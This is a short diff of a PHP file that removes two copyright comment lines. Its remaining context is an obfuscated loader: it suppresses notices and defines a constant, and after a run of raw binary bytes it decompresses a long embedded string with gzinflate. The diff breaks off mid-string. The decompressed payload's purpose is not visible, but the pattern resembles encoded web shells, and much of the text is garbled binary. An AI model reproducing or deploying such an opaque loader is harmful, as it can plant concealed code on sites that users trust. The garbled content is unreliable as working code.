@@ -1,8 +1,6 @@
 ```yarn
 <?php 
         /** 
-         *-- © : Thorsten Bylicki
-         *-- © : https://www.bylickilabs.de
          *-- © : https.//Github.com/bylickilabs
 		 */
           error_reporting(E_ALL^E_NOTICE);define('O0', 'O');¹¯«ôö«âÅô‚‡ìù¤¨ŒÃÞ‰‚Í°Òï¸Æëˆ¡¬;$_SERVER[O0] = explode('|||', gzinflate(substr('‹      íýsÛ¶õn·Ûþ+0eñÚ:õaË²k«MœfM¯½Å»\\×µ
